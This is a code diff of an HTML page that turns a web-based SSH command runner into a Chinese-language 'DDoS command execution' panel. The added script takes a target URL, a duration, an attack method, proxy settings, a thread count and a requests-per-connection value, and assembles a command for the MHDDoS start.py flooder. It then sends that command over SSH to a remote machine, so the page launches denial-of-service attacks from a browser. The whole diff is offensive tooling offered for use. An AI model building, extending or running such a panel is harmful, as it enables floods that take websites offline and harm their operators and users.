@@ -10,7 +10,7 @@
     <!-- MDUI CSS -->
     <link rel="stylesheet" href="https://unpkg.com/mdui@1.0.2/dist/css/mdui.min.css"/>
     <link rel="stylesheet" href="main.css"/>
-    <title>SSH命令执行</title>
+    <title>DDoS命令执行</title>
     <link rel="shortcut icon" href="favicon.svg" type="image/x-icon" />
     <script src="/socket.io/socket.io.js"></script>
     <script>
@@ -56,7 +56,18 @@
         const port = document.getElementById('port').value;
         const username = document.getElementById('username').value;
         const password = document.getElementById('password').value;
-        const command = document.getElementById('command').value;
+
+        const url = document.getElementById('url').value;
+        const duration = document.getElementById('duration').value;
+
+        const startpy = document.getElementById('startpy').value;
+        const method = document.getElementById('method').value;
+        const proxytype = document.getElementById('proxytype').value;
+        const threads = document.getElementById('threads').value;
+        const proxies = document.getElementById('proxies').value;
+        const rpc = document.getElementById('rpc').value;
+
+        const command = `python3 ${startpy} ${method} ${url} ${proxytype} ${threads} ${proxies} ${rpc} ${duration} true`;
         document.getElementById('output').innerHTML = '';
 
         socket.emit('execute', command, host, port, username, password);
@@ -66,7 +77,7 @@
   <body class="mdui-theme-primary-teal mdui-theme-accent-blue mdui-theme-layout-auto">
     <div class="mdui-appbar">
       <div class="mdui-toolbar mdui-color-theme">
-        <a href="/" class="mdui-typo-title">SSH命令执行</a>
+        <a href="/" class="mdui-typo-title">DDoS命令执行</a>
         <div class="mdui-toolbar-spacer"></div>
         <a href="https://github.com/SkyAerope/SSH-Web" target="_blank" class="mdui-btn mdui-btn-icon mdui-ripple mdui-ripple-white" mdui-tooltip="{content: '查看 Github'}">
           <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 36 36" enable-background="new 0 0 36 36" xml:space="preserve" class="mdui-icon" style="width: 24px;height:24px;">
@@ -76,49 +87,116 @@
       </div>
     </div>
   <div class="mdui-container">
+
     <div class="mdui-textfield mdui-textfield-floating-label mdui-col-xs-8 mdui-col-sm-10">
       <i class="mdui-icon material-icons">computer</i>
       <label class="mdui-textfield-label">主机</label>
       <input class="mdui-textfield-input" type="text" id="host" required/>
     </div>
+
     <div class="mdui-textfield mdui-textfield-floating-label mdui-col-xs-4 mdui-col-sm-2">
       <i class="mdui-icon material-icons">vpn_key</i>
       <label class="mdui-textfield-label">端口</label>
       <input class="mdui-textfield-input" type="text" id="port" value="22" required/>
     </div>
+
     <div class="mdui-textfield mdui-textfield-floating-label mdui-col-xs-12 mdui-col-sm-12">
       <i class="mdui-icon material-icons">account_circle</i>
       <label class="mdui-textfield-label">用户名</label>
       <input class="mdui-textfield-input" type="text" id="username" required/>
     </div>
+
     <div class="mdui-textfield mdui-textfield-floating-label mdui-col-xs-12 mdui-col-sm-12">
       <i class="mdui-icon material-icons">vpn_key</i>
       <label class="mdui-textfield-label">密码</label>
       <input class="mdui-textfield-input" type="password" id="password" required/>
     </div>
     <!--记住密码选项-->
-      <div class="mdui-m-l-3">
-        <label class="mdui-checkbox">
-          <input type="checkbox" id="rempwd" />
-          <i class="mdui-checkbox-icon"></i>
-          记住密码
-        </label>
-      </div>
+    <div class="mdui-m-l-3">
+      <label class="mdui-checkbox">
+        <input type="checkbox" id="rempwd" />
+        <i class="mdui-checkbox-icon"></i>
+        记住密码
+      </label>
+    </div>
+
   </div>
 
   <div class="mdui-container">
     <div class="mdui-row mdui-valign">
-      <div class="mdui-textfield mdui-textfield-floating-label mdui-col-xs-12 mdui-col-sm-11 mdui-float-left">
-        <i class="mdui-icon material-icons">code</i>
-        <label class="mdui-textfield-label">命令</label>
-        <input class="mdui-textfield-input" type="text" id="command" required/>
+      <div class="mdui-textfield mdui-textfield-floating-label mdui-col-xs-8 mdui-col-sm-9 mdui-float-left">
+        <i class="mdui-icon material-icons">language</i>
+        <label class="mdui-textfield-label">网址</label>
+        <input class="mdui-textfield-input" type="text" id="url" required/>
       </div>
-      <button class="mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent mdui-hidden-xs mdui-col-sm-1 mdui-center mdui-m-t-3" onclick="executeCommand()">执行</button>
+      <div class="mdui-textfield mdui-textfield-floating-label mdui-col-xs-4 mdui-col-sm-2 mdui-float-right">
+        <i class="mdui-icon material-icons">timer</i>
+        <label class="mdui-textfield-label">持续时间</label>
+        <input class="mdui-textfield-input" type="text" id="duration" required/>
+      </div>
+      <button class="mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent mdui-hidden-xs mdui-col-sm-1 mdui-center mdui-m-t-3" onclick="executeCommand()">开始</button>
     </div>
-    <!--手机端执行按钮-->
-    <button class="mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent mdui-hidden-sm-up mdui-col-xs-12 mdui-center" onclick="executeCommand()">执行</button>
-    </div>
+
     <p></p>
+
+      <!--高级选项-->
+    <div class="mdui-panel" mdui-panel>
+      <div class="mdui-panel-item">
+        <div class="mdui-panel-item-header">
+          <div class="mdui-panel-item-title">高级选项</div>
+          <i class="mdui-panel-item-arrow mdui-icon material-icons">keyboard_arrow_down</i>
+        </div>
+        <div class="mdui-panel-item-body">
+
+          <!--start.py位置-->
+          <div class="mdui-textfield mdui-textfield-floating-label">
+            <i class="mdui-icon material-icons">folder</i>
+            <label class="mdui-textfield-label">start.py位置</label>
+            <input class="mdui-textfield-input" type="text" id="startpy" value="~/MHDDoS/start.py" required/>
+          </div>
+          <!--方法-->
+          <div class="mdui-textfield mdui-textfield-floating-label">
+            <i class="mdui-icon material-icons">tune</i>
+            <label class="mdui-textfield-label">方法</label>
+            <input class="mdui-textfield-input" type="text" id="method" value="TCP" required/>
+          </div>
+          <!--代理类型-->
+          <div class="mdui-textfield mdui-textfield-floating-label">
+            <i class="mdui-icon material-icons">http</i>
+            <label class="mdui-textfield-label">代理类型</label>
+            <input class="mdui-textfield-input" type="text" id="proxytype" value="0" required/>
+            <div class="mdui-textfield-helper">6 = RANDOM, 5 = SOCKS5, 4 = SOCKS4, 1 = HTTP, 0 = ALL</div>
+          </div>
+          <!--线程数-->
+          <div class="mdui-textfield mdui-textfield-floating-label">
+            <i class="mdui-icon material-icons">settings</i>
+            <label class="mdui-textfield-label">线程数</label>
+            <input class="mdui-textfield-input" type="text" id="threads" value="100" required/>
+          </div>
+          <!--代理文件位置-->
+          <div class="mdui-textfield mdui-textfield-floating-label">
+            <i class="mdui-icon material-icons">folder</i>
+            <label class="mdui-textfield-label">代理文件位置</label>
+            <input class="mdui-textfield-input" type="text" id="proxies" value="~/MHDDoS/files/proxies/proxies" required/>
+          </div>
+          <!--单连接请求数-->
+          <div class="mdui-textfield mdui-textfield-floating-label">
+            <i class="mdui-icon material-icons">import_export</i>
+            <label class="mdui-textfield-label">单连接请求数</label>
+            <input class="mdui-textfield-input" type="text" id="rpc" value="800" required/>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!--手机端执行按钮-->
+    <p class="mdui-hidden-sm-up"></p>
+    <button class="mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent mdui-hidden-sm-up mdui-col-xs-12 mdui-center" onclick="executeCommand()">开始</button>
+
+  </div>
+
+    <p></p>
+
   <div class="mdui-container mdui-typo">
     <div class="mdui-typo-caption-opacity">将使用wss协议加密传输至后端，由后端代为发送SSH指令。</div>
     <div class="mdui-typo-headline mdui-m-l-2">输出</div>
@@ -133,6 +211,7 @@
     </div>
 
   </div>
+
     <!-- MDUI JavaScript -->
     <script src="https://unpkg.com/mdui@1.0.2/dist/js/mdui.min.js"></script>
 
@@ -162,22 +241,44 @@
 
   // 读取cookie并显示至网页
     document.getElementById('host').value = getCookie('host');
-    // 如果不存在port，就设置为22，否则从cookie获取
-    if (getCookie('port') === '') {
-      setCookie('port', '22', 365);
-    } else {
+    // 如果存在port，就执行从cookie获取
+    if (getCookie('port') !== '') {
       document.getElementById('port').value = getCookie('port');
     }
     document.getElementById('username').value = getCookie('username');
     // 如果勾选了记住密码，就执行从cookie获取密码
     if (getCookie('rempwd') === 'true') {
       document.getElementById('password').value = getCookie('password');
-    }
-    //如果上次勾选了记住密码，就继续勾选
-    if (getCookie('rempwd') === 'true') {
+      //如果上次勾选了记住密码，就继续勾选
       document.getElementById('rempwd').checked = true;
     }
-    document.getElementById('command').value = getCookie('command');
+
+    document.getElementById('url').value = getCookie('url');
+    document.getElementById('duration').value = getCookie('duration');
+    //如果存在startpy，就执行从cookie获取
+    if (getCookie('startpy') !== '') {
+      document.getElementById('startpy').value = getCookie('startpy');
+    }
+    //如果存在method，就执行从cookie获取
+    if (getCookie('method') !== '') {
+      document.getElementById('method').value = getCookie('method');
+    }
+    //如果存在proxytype，就执行从cookie获取
+    if (getCookie('proxytype') !== '') {
+      document.getElementById('proxytype').value = getCookie('proxytype');
+    }
+    //如果存在threads，就执行从cookie获取
+    if (getCookie('threads') !== '') {
+      document.getElementById('threads').value = getCookie('threads');
+    }
+    //如果存在proxies，就执行从cookie获取
+    if (getCookie('proxies') !== '') {
+      document.getElementById('proxies').value = getCookie('proxies');
+    }
+    //如果存在rpc，就执行从cookie获取
+    if (getCookie('rpc') !== '') {
+      document.getElementById('rpc').value = getCookie('rpc');
+    }
 
   // 从网页输入写入cookie
     document.getElementById('host').onchange = () => {
@@ -215,16 +316,32 @@
         setCookie('password', '', 365);
       }
     };
-    // // 选择取消则取消打勾
-    // function CancelRemPwd(){
-    // document.getElementById('rempwd').checked = false;
-    //         setCookie('rempwd', 'false', 365);
-    //         setCookie('password', '', 365);
-    // }
 
-    document.getElementById('command').onchange = () => {
-      setCookie('command', document.getElementById('command').value, 365);
+    document.getElementById('url').onchange = () => {
+      setCookie('url', document.getElementById('url').value, 365);
     };
+    document.getElementById('duration').onchange = () => {
+      setCookie('duration', document.getElementById('duration').value, 365);
+    };
+    document.getElementById('startpy').onchange = () => {
+      setCookie('startpy', document.getElementById('startpy').value, 365);
+    };
+    document.getElementById('method').onchange = () => {
+      setCookie('method', document.getElementById('method').value, 365);
+    };
+    document.getElementById('proxytype').onchange = () => {
+      setCookie('proxytype', document.getElementById('proxytype').value, 365);
+    };
+    document.getElementById('threads').onchange = () => {
+      setCookie('threads', document.getElementById('threads').value, 365);
+    };
+    document.getElementById('proxies').onchange = () => {
+      setCookie('proxies', document.getElementById('proxies').value, 365);
+    };
+    document.getElementById('rpc').onchange = () => {
+      setCookie('rpc', document.getElementById('rpc').value, 365);
+    };
+
   </script>
   </body>
 </html>
